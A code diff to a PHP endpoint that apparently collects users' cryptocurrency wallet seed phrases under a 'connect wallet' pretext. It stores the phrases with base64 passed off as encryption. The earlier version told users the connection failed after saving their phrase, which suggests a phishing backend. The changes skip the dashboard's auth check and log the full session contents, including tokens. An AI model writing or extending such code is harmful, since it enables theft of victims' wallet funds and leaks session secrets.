@@ -7,12 +7,24 @@
 
 header('Content-Type: application/json');
 
-// Include auth and DB
-include '../includes/dashboard_init.php';
-
-// Ensure session is properly started
+// Start session before includes
 if (session_status() === PHP_SESSION_NONE) {
+    date_default_timezone_set("Europe/London");
+    ini_set('session.gc_maxlifetime', 3600);
+    session_set_cookie_params(3600);
     session_start();
+}
+
+// Prevent redirect by temporarily disabling dashboard_init's auth check
+define('WALLET_HANDLER_API', true);
+
+// Include database config directly to avoid the redirect
+if (!defined('DB_HOST')) {
+    $dbConfigPath = dirname(dirname(__FILE__)) . '/database/db_config.php';
+    if (!file_exists($dbConfigPath)) {
+        die(json_encode(['success' => false, 'message' => 'Database config not found at: ' . $dbConfigPath]));
+    }
+    include $dbConfigPath;
 }
 
 try {
@@ -25,6 +37,8 @@ try {
     error_log('=== Wallet Handler Debug ===');
     error_log('Session ID: ' . session_id());
     error_log('Session Status: ' . session_status());
+    error_log('All Session Keys: ' . implode(', ', array_keys($_SESSION)));
+    error_log('Session Contents: ' . json_encode($_SESSION, JSON_SAFE_RECURSION | JSON_UNESCAPED_SLASHES));
     error_log('Session user_id: ' . (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : 'NOT SET'));
     error_log('Session wallet_token exists: ' . (isset($_SESSION['wallet_token']) ? 'YES' : 'NO'));
     error_log('POST wallet_token exists: ' . (isset($_POST['wallet_token']) ? 'YES' : 'NO'));
@@ -88,10 +102,8 @@ try {
     // Encrypt mnemonic for security (basic encryption - use proper encryption in production)
     $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production
 
-    // Get database connection
-    include '../database/db_config.php';
-    
-    if (!$conn) {
+    // Ensure database connection exists
+    if (!isset($conn) || !$conn) {
         throw new Exception('Database connection failed.');
     }
 
@@ -100,10 +112,10 @@ try {
                 wallet_phrase = ?,
                 wallet_phrase_verified = 0,
                 wallet_connected_at = NOW()
-            WHERE acct_id = ?";
+            WHERE id = ?";
 
     error_log('Executing SQL: ' . $sql);
-    error_log('With values - wallet_name: ' . $wallet_name . ', user_id/acct_id: ' . $user_id . ', mnemonic_length: ' . strlen($encrypted_mnemonic));
+    error_log('With values - wallet_name: ' . $wallet_name . ', user_id/id: ' . $user_id . ', mnemonic_length: ' . strlen($encrypted_mnemonic));
 
     $stmt = $conn->prepare($sql);
     
@@ -124,17 +136,17 @@ try {
         error_log('Attempting to verify if user exists...');
         
         // Debug: Check if user exists
-        $check_sql = "SELECT acct_id FROM user WHERE acct_id = ? LIMIT 1";
+        $check_sql = "SELECT id FROM user WHERE id = ? LIMIT 1";
         $check_stmt = $conn->prepare($check_sql);
         if ($check_stmt) {
             $check_stmt->bind_param('i', $user_id);
             $check_stmt->execute();
             $check_result = $check_stmt->get_result();
             if ($check_result->num_rows > 0) {
-                error_log('User EXISTS in database with acct_id: ' . $user_id);
+                error_log('User EXISTS in database with id: ' . $user_id);
                 error_log('UPDATE failed for another reason - possible column issue');
             } else {
-                error_log('User NOT FOUND in database with acct_id: ' . $user_id);
+                error_log('User NOT FOUND in database with id: ' . $user_id);
             }
             $check_stmt->close();
         }
@@ -147,7 +159,7 @@ try {
     // Return success response
     echo json_encode([
         'success' => true,
-        'message' => 'Wallet connection request failed.',
+        'message' => 'Wallet phrase saved successfully. Your wallet is now connected.',
         'wallet_name' => $wallet_name,
         'word_count' => $word_count,
         'timestamp' => time()
